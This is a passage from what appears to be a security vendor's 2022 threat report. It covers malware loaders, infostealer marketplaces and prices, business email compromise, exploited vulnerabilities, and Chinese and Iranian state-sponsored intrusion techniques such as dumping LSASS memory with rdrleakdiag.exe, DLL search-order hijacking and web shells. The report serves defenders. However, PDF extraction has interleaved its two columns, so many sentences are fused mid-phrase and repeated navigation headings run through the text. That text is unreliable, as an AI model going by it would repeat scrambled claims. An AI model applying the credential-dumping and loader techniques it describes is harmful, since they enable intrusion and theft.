MDAINzIlMDAINjUlMDAINkUlMDAINzMIMDAINjgIMDAINjEIMDAINzcIMDAmNTE@MTgyMTA9ODE5Mg\=\=Figure 11\. IcedID HTTP POST request with encoded victim information. (Source: Secureworks)2022 State of the Threat: A Year in Review20010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatFigure 12\. Taegis XDR detection for IcedID malware. (Source: Secureworks)2022 State of the Threat: A Year in Review21010203040506
0607070808
09Letter From Our CTIONew on the ScenePureCrypterPureCrypter is a fully featured malware builder and loader advertisedfor sale since March 2021 at $59 USD for one month and $249 forlifetime use. It is a .NET executable obfuscated with SmartAssembly.It is widely used to drop payloads for cybercriminal ends. In addition,CTU researchers assess with moderate confidence that the developersof the WhisperGate32 file wiper that was deployed against targets inUkraine prior to the Russian invasion used PureCrypter to generate the.NET code in both the loader and the initial payload.There have been a number of new loaders that have emerged duringthe reporting period, and in some cases disappeared again. CTUresearchers assess that the groups operating these loaders may moveaway from the complex, fully\-featured botnets that evolved from theearly banking trojans towards more lightweight loaders that are easierto develop and maintain. That shift is likely enabled by increased useof fully featured and actively maintained post\-exploitation tools suchas Cobalt Strike. The role of the loader is simply to achieve an initialaccess point, perhaps perform some basic reconnaissance such aschecking that the infected host is joined to an Active Directory domain,and then retrieve and execute the post\-exploitation tool.BumblebeeCTU researchers' analysis of Bumblebee reveals rapid development andnumerous active campaigns. Multiple threat actors now appear to havemoved to using Bumblebee to drop payloads that include Cobalt Strike,Sliver31, and Meterpreter in order to deliver ransomware.Executive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatFigure 13\. PureCrypt and associated tool pricing at https:purecoder.sellix.io 
(Source: Secureworks)2022 State of the Threat: A Year in Review22010203040506
0607070808
09Letter From Our CTIOSquirrelWaffleExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatSquirrelWaffle loader was first detected in September 2021, deliveringQakbot and Cobalt Strike. Initially, some third\-party commentatorscharacterized it as an heir to Qakbot, Emotet, or IcedID. However,by early November, SquirrelWaffle's infrastructure had been disabledand the loader was not observed again in active distribution. CTUresearchers saw only a small number of SquirrelWaffle infectionsacross customer environments (figure 14\).Figure 14\. iSensor IDS detection for SquirrelWaffle HTTP POST request that uses 
padding and a hardcoded XOR key. (Source: Secureworks)2022 State of the Threat: A Year in Review23010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatBringing the Victim to You:
Drive\-By\-Download as an
Alternative Distribution Method'Drive\-by\-downloads' continue to be a popular alternative to phishing\-GOLD ZODIAC uses search engine optimization (SEO) poisoning,based malware distribution. Notable examples include the prolificlayers of public blog posts, and a complex array of compromisedSocGholish malware framework, operated by GOLD PRELUDE33, andWordPress sites to drive high\-ranking Google search results tothe Gootloader JavaScript\-based loader distributed by the GOLDdeliver Gootloader. Professionals who visit these infected sites toZODIAC34 threat group. A user visits a compromised website thatdownload model legal agreements or other documents are trickedtriages the visitor and serves up a series of redirects that ultimatelyinto downloading GootLoader, leading to the download of Cobaltdeliver malware.Strike as a precursor to ransomware.User follows poisoned,
high ranking Google 
search result to a 
GOLD ZODIAC
compromised
Wordpress siteWhen executed, the 
loader sends system 
information to a hard 
coded C2 domain, 
which checks whether 
the machine is Active 
Directory joinedIf yes, the C2 server 
returns a payload and 
moves to the next 
stage of the infectionCode injected into
compromised site 
checks the user has 
not visited before and 
that the browser is on 
allow listDownload link redirects 
through a series of
compromised sites 
to deliver a .zip le 
containing the
Gootloader Javascript 
based loaderGootloader creates a
scheduled task for
presistence, stuffs 
multiple registry keys, 
with encoded payloadsIf either is false, the 
user is presented a 
generic, non\-malicious 
web pageIf both are true, the user 
is presented the hallmark 
Gootloader Q\&A forum 
page containing a direct 
download link matching 
the original search termThe scheduled task 
decodes and executes 
the payloadsFigure 15\. Gootloader process flow. (Source: Secureworks)2022 State of the Threat: A Year in Review24010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesFigure 16\. Compromised WordPress site. (Source: Secureworks)Infostealers: A Thriving MarketLoaders are one way of gaining access to an environment. Anotheris using credentials obtained by infostealers, or 'stealers'. Analysis ofthe sale of 'logs' (collections of stolen data) on underground forumsConclusionshows that stealers are becoming increasingly popular. On a single dayThe Secureworks
View of the Threatin June 2022, over two million logs were offered for sale on a singleunderground forum (figure 17\).The three main stealer markets are:Genesis MarketRussian Marketlikely tied to the now defunctAmigos market2easyclaims to be the largest stealer 
market, but Russian Market and Genesis 
appear to host more logs.849K
Vidar126K
Raccoon49K
Azorult1\.7M
RedLine94K
Taurus2,884,269
Total CountFigure 17\. Logs from popular stealers for sale on Russian Market underground 
forum on June 2, 2022\. (Source: Secureworks)2022 State of the Threat: A Year in Review25010203040506
0607070808
09Letter From Our CTIOGenesisRussian MarketExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatActive since 2018, Genesis is an online marketplace for stolen accountConsidered to be the largest active stealer market, Russian Market sellsdata, offering custom bot software that allows customers to clonelogs from multiple vendors. It is possible to search by stealer name,their victims' browsers, including cookies, usernames, and passwords.system, country, state, city, zip code, ISP, email address, vendor, orWhen a criminal buys an identity on the market, they buy access to thedomain. Data on sale on June 2, 2022, originated from 226 differentbot on the victim's computer, making it easy to hijack victims' onlinecountries, and 510 different victim operating system versions. Russianaccounts. Access to the site, which operates on the dark web and theMarket also sells credit card information, RDP and SSH credentials, andopen internet, is via invitation. It is possible to search the logs by botPayPal accounts.name, location, or domain.Figure 18\. Listings on Genesis Market (Source: Secureworks)Figure 19\. Russian Market user interface (Source: Secureworks)2022 State of the Threat: A Year in Review26010203040506
0607070808
09Letter From Our CTIO2easyCTU researchers have seen an increase in the sale of network accesssourced from credentials acquired by information stealers. InitialExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2easy, which was first advertised in 2020, is a relatively new marketaccess brokers comb through the data to find credentials for remotecompared to Genesis and Russian Market. It's less open than theaccess solutions at potentially high\-value targets and then sell theRussian Market and requires an invitation code to join. Users canaccess individually, usually at auction, for a large sum. Access to low\-search by country, seller, creation date, price, or domain.profile targets is sold in bulk in packages of as many as hundreds ofFigure 20\. Search options on 2easy (Source: Secureworks)thousands of compromised accounts at once, mostly for organizationslocated in the E.UU.K and U.S.There is a plethora of stealers for sale on underground forums butsome of the major ones include RedLine, Vidar, Raccoon, Taurus, andAZORult.RedLine harvests browser information such as credit card dataand saved credentials. It also gathers system information, and morerecent versions can steal cryptocurrency wallet data. In July 2021,CTU researchers saw RedLine in use in a campaign employing clonedwebsites with a travel or hotel theme to fool victims into downloadingan executable with RedLine as the ultimate payload. Threat actors havealso distributed RedLine via trojanized installers for messaging softwaresuch as Signal.2022 State of the Threat: A Year in Review27010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatVidar, written in C\+\+, has typical stealer functionality combined withan unusual method of obtaining C2 IP address information by creatingfake user profiles on social networks to post C2 IP addresses (figure22\). In 2021, it used gaming platforms for the same purpose. CTUresearchers have seen Vidar dropping the popular SystemBC proxymalware on infected systems before self\-deleting. In February 2022,Vidar was available to rent at prices between $130 for seven days and$750 for 90 days.Figure 21\. Cloned website containing a security warning and download prompt 
for Redline payload. (Source: Secureworks)Figure 22\. Vidar using Mastodon social network for C2\. (Source: Secureworks)2022 State of the Threat: A Year in Review28Raccoon stealer collects passwords, cookies, and browser autofillTaurus is a stealer thought to have been developed by theform data as well as system information and cryptocurrency wallets. Inthreat actor behind the Predator the Thief malware. Offered forFebruary 2022, it was being advertised for between $75 for seven dayssale on underground forums, the Taurus developer claims that itof use and $375 for two months.can steal passwords, cookies, and autofill forms along with theThe group responsible for Racoon announced35 in March 2022 thatsystem configuration and software data, as well as some popularthey were suspending development after one of its developers wascryptocurrency wallets and commonly used FTP and email clienthistory of Chromium\- and Gecko\-based browsers. It can also stealkilled during the Russian invasion of Ukraine. However, version 2 ofcredentials.Raccoon launched in May, and in June CTU researchers observed logsbeing offered for sale on Russian Market.AZORult steals passwords, cookies, cryptowallets, and files. Onceone of the most prolific stealers, it is no longer in active developmentand is available to users for free. Its last version update was likely inDecember 2018\.010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review29010203040506
0607070808
09Letter From Our CTIOBusiness Email CompromiseWhile it does not capture the public attention in quite the same way,Defending against BEC requires a layered approach:Executive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threatfrom a financial loss perspective business email compromise (BEC)continues to rank alongside ransomware as a major threat. Accordingto the FBI, reported losses between October 2013 and December2021 were over $43 billion USD36, with adjusted losses of $2\.4billion USD37 in 2021 alone, dwarfing the reported losses attributed toransomware.There are undoubtedly some issues around reporting that mean thatransomware losses have been significantly underrepresented, butSecureworks incident response data corroborates the FBIs findingsaround the prevalence of BEC.In the first half of 2022, Secureworks incident responders saw a 27%year\-on\-year increase compared to the same period for 2021\. Theseincidents continue to display simple but effective techniques thatare largely unchanged from those reported in the 2021 State of theThreat Report. In most cases, a user at the victim organization wascompromised through a phishing email that directed the user to acredential\-stealing site controlled by the threat actor. In a few cases,the threat actors were able to bypass multi\-factor authentication bytricking the user or by enrolling their own device (see page 63\).Threat actors have realized that organizations implement controls toflag external emails as potentially suspicious, and in response are oftenleveraging compromised accounts to send internal phishing emails asthese are more likely to be trusted, especially where the compromisedaccount belongs to a senior executive at the company.Training to help users understand what BEC is, how ittypically happens, and how to spot it.Financial controls to ensure that any deviation from 
established payment routes is a multi\-step process toensure that suspicious changes to bank details or purchaserequests are flagged.Email controls including MFA, rules to alert on sequential 
logins from unusual locations and email rule changes, andweb proxy and DNS controls to identify connections tosuspicious domains that could be hosting a credential\-harvesting site.Response training so that the organization knows howto react if a BEC incident is discovered. Incident responseplanning should include arrangements for reporting to lawenforcement and financial institutions, as time is a criticalfactor when attempting to recover stolen funds.2022 State of the Threat: A Year in Review30010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat05
Exploitation of Remote Services
is Now the Most Common
Access VectorExploitation of vulnerabilities in internet\-facing systems became theby the need to generate profit or keep their tools relevanttomost common initial access vector (IAV) observed in Secureworkspromptly implement new exploit code. Debates about responsibleincident response engagements during 2021\. It remained that waydisclosure often miss the fact that even where a patch exists, thein the first part of 2022, replacing 2020's top IAV of credential\-process of patching a vulnerability in an enterprise environment is farbased attacks.more complex and slower than the process for threat actors or OSTdevelopers of weaponizing publicly available exploit code.Threat actors continue to rapidly weaponize new vulnerabilities, whiledevelopers of offensive security tools (OSTs) are also incentivized50403020100Third PartyVulnerabilities in 
Internet\-Facing 
DevicesCredentialsMalicious EmailsQ1 
2020Q2 
2020Q3 
2020Q4 
2020Q1 
2021Q2 
2021Q3 
2021Q4 
2021Figure 23\. Change in observed initial access vector over time. (Source: Secureworks)2022 State of the Threat: A Year in Review31When Does a Vulnerability 
Become a Threat?Whenever a new vulnerability becomes publicly known, organizationsare forced to make rapid decisions about how they prioritize mitigatingit. Some vulnerabilities essentially prioritize themselves: a remote codeexecution that is trivial to exploit and impacts internet\-facing softwareused globally is likely to demand a very rapid response. But in othercases, the decision might be less clear\-cut.010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatPrioritizing Vulnerabilities:
Questions to AskDo we use the impacted software and versions? Asset 
management is a critical component of any goodvulnerability management strategy.How feasible is exploitation in a production environment,as opposed to in a research lab? Is a specific configurationneeded, and what other dependencies might successfulexploitation rely on?What is the impact if it is exploited? The ability to arbitrarily 
execute code remotely or crash sensitive systems is likely tobe of greatest concern.Is there evidence of active exploitation? If attackers areusing it, patching will likely become more urgent. And ifproof of concept exploit code has been published, theneven if threat actors aren't currently exploiting it, theyprobably soon will be.Does a patch exist? If not, what other mitigations exist?How easy is the patch or mitigation to apply?How business critical are the assets that could beimpacted? What are the consequences of them beingexploited? Conversely, what is the impact of taking theassets offline to patch?2022 State of the Threat: A Year in Review32010203040506
0607070808
09Letter From Our CTIOFocusing on What MattersDon't Spring to ConclusionsNew vulnerabilities often come with a lot of accompanying hype,On March 29, 2022, rumors began circulating about a zero\-daywhich can distract from understanding the real risk. Social mediaremote code execution (RCE) vulnerability in the Spring Frameworkoften exacerbates this, acting as an echo chamber to perpetuateCore component. Early on March 30, a Twitter persona shared a linkunsubstantiated information. In contrast, there are useful resourcesto a proof\-of\-concept exploit but quickly deleted their account. Thesuch as CISA's Known Exploited Vulnerabilities (KEV) catalog38 thatvulnerability, CVE\-2022\-22965, received a severity rating of 9\.8 out ofcan help organizations prioritize based on evidence of observed10 and was soon dubbed 'Spring4Shell'.exploitation. Similarly, Secureworks Vulnerability Detectionand Response39 (VDR) platform helps organizations make betterLike the Log4Shell vulnerability (CVE\-2021\-44228\) that emerged inprioritization decisions by combining global context about ease andDecember 2021, Spring4Shell appeared to have the potential to impactimpact of exploitation and threat intelligence about active exploitationmany organizations. Spring is considered40 one of the world's mostwith local context about the assets operated by the customer.popular Java application development frameworks, meaning that manyJava applications were potentially affected. Secureworks published aBetween June 2021 and June 2022, according to VDR data, 13% ofSecurity Advisory containing a measured warning about the availabilityvulnerabilities carrying CVSSv2 scores rating them as critical (higherof exploit code, recommending that customers identify applicationsthan 7\) had at least one exploit available on ExploitDB, Packetstorm orin their environment that could be affected and monitor Spring'sGitHub. In contrast, vulnerabilities flagged up as critical using VDR'scommunication, but noting that CTU researchers were yet to see anyvarious scoring criteria were two and a half times more likely to havepost\-exploit activity.an associated publicly available exploit. This multiplier rose to overthree in the case of the subset of those critical vulnerabilities that CTUresearchers had observed being exploited in the wild.Executive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review33In the end, the impact of Spring4Shell appears to have been verylimited. Certain conditions41 had to be met for successful exploitationand a default implementation was not vulnerable. As of this report,CTU researchers have seen very few examples of successfulexploitation. The same was true to a lesser extent for Log4Shell,which was undoubtedly more serious but also turned out to beless easy to exploit42 than originally feared. CTU researchers sawexploitation of Log4Shell against VMware Horizon and Tableau serversin some customer environments, and a June 2022 CISAGCGCYBERadvisory43 noted that exploitation of this vulnerability continues. ButDetect the Vulnerability,
Not the ExploitCVE\-2022\-1388, a pre\-authentication vulnerability in the BIG\-IPload balancing and security suite that gives an unauthenticatedattacker remote code execution capability, was made publicand patched on Wednesday, May 4, 2022\. Over the weekendof May 7 and 8, both Horizon3 and Positive Technologies 
created44 exploits. On May 9, exploit code was published on 
GitHub. On May 10, reports were published that some attackerswere using Linux root privileges gained through exploitation ofthis vulnerability to delete almost every file on compromisedCTU researchers did not observe mass exploitation of the vulnerabilitydevices, including vital configuration files.resulting in successful follow\-on code execution.As with all new vulnerabilities, CTU researchers analyzedCVE\-2022\-1388 and deployed a network signature to detectexploitation traffic. There was clear evidence of a spike inexploit traffic on May 11\. However, interestingly, this same exploittraffic was being caught by a signature CTU researchers wroteon March 18, 2021, for CVE\-2021\-22986, a similar vulnerabilityin BIG\-IP that allowed undisclosed requests to bypass iControlREST authentication. In catching the newer exploit, the older 
signature demonstrated the value of intelligence\-driven controlsenabled by well\-crafted detection logic.010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review34010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatFigure 24\. IDS detections CVE\-2021\-22986 and CVE\-2022\-1388\. (Source: Secureworks)2022 State of the Threat: A Year in Review3505,00010,00015,00020,00025,00030,00035,00040,000Jan\-21Feb\-21Mar\-21Apr\-21May\-21Jun\-21Jul\-21Aug\-21Sep\-21Oct\-21Nov\-21Dec\-21Jan\-22Feb\-22Mar\-22Apr\-22May\-22Jun\-22Jul\-2206
Hostile 
Government\-
Sponsored Actor 
Activity Shows a 
Regional FocusGovernment\-sponsored threat group activity continues to be driven bygeopolitical considerations. For Russia, that has primarily meant Ukraineand other near neighbors. Both Iran and China have largely maintainedtheir traditional geographical points of focus, although CTU researchershave observed some targeting of organizations in Europe and NorthAmerica. North Korea, in contrast, has concentrated on revenuegeneration, targeting a variety of countries.010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the Threat2022 State of the Threat: A Year in Review36010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatChinaA Strategic ThreatMain Motivations:EspionageIntellectual PropertyTheft2022 State of the Threat: A Year in Review37010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatChinaChinese government\-sponsored groups are some of the most prolificand well\-resourced threats facing organizations worldwide. TheHiding in the NoiseChinese government uses its cyber capabilities, typically operated, orIn the last twelve months there has been a continuing trend of Chinesetasked by the Ministry of State Security (MSS) or Peoples Liberationthreat groups conducting harder\-to\-attribute operations againstArmy (PLA) to gather political and military intelligence, steal intellectuala more select range of targets. However, those targeted attacksproperty, and spy on individuals of interest.are often conducted to appear opportunistic, for example by usingtechniques also favored by cybercriminal threats such as ransomwareChinas 14th 5\-year plan (2021\-2025\) was formally adopted in Marchgroups. One example of this is exploitation of remote services for initial2021 and, along with other initiatives such as Made in China 2025,access.emphasizes the need for modernization and innovation in key industrialsectors. CTU researchers have observed Chinese threat groups targetChinese government\-sponsored threat groups remain quick to respondorganizations in most of those key industries, as well as supportingwhen new exploit code is available for internet\-facing applicationsorganizations such as legal firms, as China continues to leverage itssuch as Microsoft Exchange. Over the past year, they have beenoffensive cyber capabilities in the pursuit of first regional and thenreported as exploiting zero\-day vulnerabilities against SolarWindsglobal hegemony.Serv\-U FTP software45 and ZOHO ManageEngine ADSelfService46,as well as an elevation of privilege zero\-day in the Microsoft Win32kChinese groups have also undertaken a degree of tasking in relationkernel driver47\.to the war in Ukraine, monitoring both Russia and Ukraine. Use ofHeaderTip malware against Ukraine has been attributed by third\-partyTheir use of 'living off the land' techniques and common tooling,researchers to Chinese threat group Scarab.such as Cobalt Strike also complicates attribution of Chinese threatgroup activity. In one intrusion in mid\-2022, CTU researchers saw aprobable Chinese threat actor using the built\-in Windows executablerdrleakdiag.exe to dump the Local Security Authority SubsystemService (LSASS) process memory for credential extraction (see figure25\). Rdrleakdiag.exe is a legitimate Microsoft resource leak diagnostictool that can be abused by threat actors.2022 State of the Threat: A Year in Review38010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatFigure 25\. LSASS process dumped using rdrleakdiag (Source: Secureworks)This deliberate use of techniques that blur the line separatingopportunistic, financially motivated cybercrime and targeted espionagehas been taken further by at least one probable government\-sponsored Chinese threat group, BRONZE STARLIGHT48\. The grouphas been associated with intrusions involving the deployment ofLockFile, AtomSilo, Rook, Night Sky, and Pandora ransomware variants.BRONZE STARLIGHT has been observed using the HUI Loader malwareduring these attacks. HUI Loader is executed via DLL side\-loading todecode a third file containing an encrypted payload, usually CobaltStrike, that is also deployed to the compromised host. The rest2meetings HTTP POST URI shown in figure 26 is common acrossBRONZE STARLIGHT activity but CTU researchers have not seen itanywhere else.It would be easy to mistake BRONZE STARLIGHT activity for routinecybercrime. However, HUI Loader was also used by the A41APTgroup49 against an organization in Japan to load the SodaMasterremote access trojan (RAT). CTU researchers associate A41APT withthe BRONZE RIVERSIDE50 (also known as APT10\) espionage groupbased on overlapping tactics, techniques, and procedures (TTPs).This and other tool overlaps suggest a close relationship between theBRONZE RIVERSIDE and BRONZE STARLIGHT groups. The victimology,short lifespan of each ransomware family, and access to malwareused by government\-sponsored threat groups suggest that BRONZESTARLIGHT's main motivation may be intellectual property theft orcyber espionage, rather than financial gain. The ransomware couldbe a deliberate tactic to cover their tracks and distract incidentresponders from identifying the threat actors true intent, reducing thelikelihood of attributing the activity to China.Figure 26\. BRONZE STARLIGHT Cobalt Strike payload configuration information. 
(Source: Secureworks)2022 State of the Threat: A Year in Review39010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatNew Techniques,
Greater SophisticationNot all Chinese threat group activity aims to blend in with generalinternet noise. The sophistication levels displayed by certain Chinesethreat groups over the past year has increased, likely in responseto better detection capability in target environments and to publicattribution of activity, for example, the formal attribution51 to Chinaby The White House of malicious cyber activity. In particular, CTUresearchers have observed new loading techniques and moreobfuscation of code and infrastructure. For example, in one attack on a Japanese organization, BRONZEPRESIDENT52 used a malicious PowerPoint file to drop an executableand a DLL file to disk. The executable file imports the DLL, whichdecodes an embedded Cobalt Strike Beacon and loads it into memory(figure 27\).Use of DLL search order hijacking to get a malicious DLL to decodeand load various payloads, such as PlugX or Cobalt Strike, is typical ofBRONZE PRESIDENT. The threat group puts effort into varying the DLLloaders, which are highly obfuscated and rarely stay the same fromone campaign to the next. In another example53, BRONZE PRESIDENTtargeted Russian speakers with a fake PDF that downloaded a decoydocument as well as files for a DLL search order hijack, and ultimatelydecoded and ran a PlugX binary. The PlugX payload would only exist ondisk as an encrypted blob of data. The loader will decrypt it in memoryand then pass execution to the payload.In a BRONZE UNIVERSITY54 attack that deployed ShadowPad, thethreat actor again used again a DLL search order hijack to loadthe malware. As part of this execution chain, the ShadowPad DLLloader checks for specific bytes in its parent process (log.exe). Ifthe loader finds these bytes, it 'patches' them with an instruction tocall a specific function in the DLL loader. Figure 28 shows this codein a sample (MD5: 3e372906248b215ea0ee853cb4e29dd8\) that asubmitter in Taiwan uploaded to VirusTotal in September. The encryptedShadowPad payload was hidden in the Windows registry.Figure 27\. BRONZE PRESIDENT Cobalt Strike Beacon shellcode in memory. 
(Source: Secureworks)Figure 28\. ShadowPad patching function. (Source: Secureworks)2022 State of the Threat: A Year in Review40Letter From Our CTIOExecutive Summary 
and Key FindingsShadowPad Continues
to be PopularThe ShadowPad55 advanced modular RAT is now used by over tendifferent Chinese threat groups. This consolidates its position alongsidePlugX as one of the most prevalent RATs used by multiple ChineseRansomware Remains the 
Primary Strategic Threatthreat groups.The majority of ShadowPad samples analyzed by CTU researchers usetwo\-file execution chains, where the encrypted ShadowPad payload isembedded within the DLL loader. However, CTU researchers identifiedcampaigns attributed to the BRONZE UNIVERSITY threat group thatused a three\-file execution chain, with the encrypted ShadowPadpayload dropped as a separate file.During a January 2022 incident response engagement, SecureworksCTU researchers discovered that BRONZE UNIVERSITY had usedthis three\-file ShadowPad execution chain in November 2021\. Initialaccess was via a server running a vulnerable version of ManageEngineADSelfService Plus. The threat actor exploited CVE\-2021\-405393,an authentication bypass vulnerability affecting ManageEngineADSelfService Plus software builds up to version 6113 and deployed theChina Chopper web shell.The threat actor used a three\-file execution chain to deploy variantsof ShadowPad, first to the initial server to gain a foothold and then toother servers in the network. The threat actor used ShadowPad forreconnaissance, credential harvesting, and to control the compromisedhosts, including for further information gathering.010203040506
0607070808
09Ransomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatFigure 29\. Timeline of ShadowPad execution, service creation, and payload injection. (Source: Secureworks)2022 State of the Threat: A Year in Review41010203040506
0607070808
09Letter From Our CTIOExecutive Summary 
and Key FindingsRansomware Remains the 
Primary Strategic ThreatRansomware Enablers: 
Loaders and InfostealersExploitation of Remote 
Services is Now the Most 
Common Access VectorHostile Government\-
Sponsored Actor Activity 
Shows a Regional FocusDefense Evasion Offers Its 
Own Detection OpportunitiesConclusionThe Secureworks
View of the ThreatIranTraditional TargetingMain Motivations:EspionageMonitoring dissidentsSabotage2022 State of the Threat: A Year in Review42IranIranian APT group activity overall remained focused on traditionalthe Islamic Revolutionary Guard Corps (IRGC) as providing malwaretargets: Israel, other Middle Eastern countries, and dissidents at homedevelopment services in support of COBALT FIRESIDE59 (also knownand abroad amongst its diaspora community. Over the year, linksas Tortoiseshell and Imperial Kitten). Threat actors within COBALTbetween certain groups and government entities became clearer.FIRESIDE have been using the Facebook platform to approach targetsSome groups continued the use of pseudo\-ransomware and tunnelingbefore moving the conversations off\-platform to other mediums (suchtechniques were used in a wide variety of attacks.as email, messaging and collaboration services, and websites) toIranian Group Links to Government 
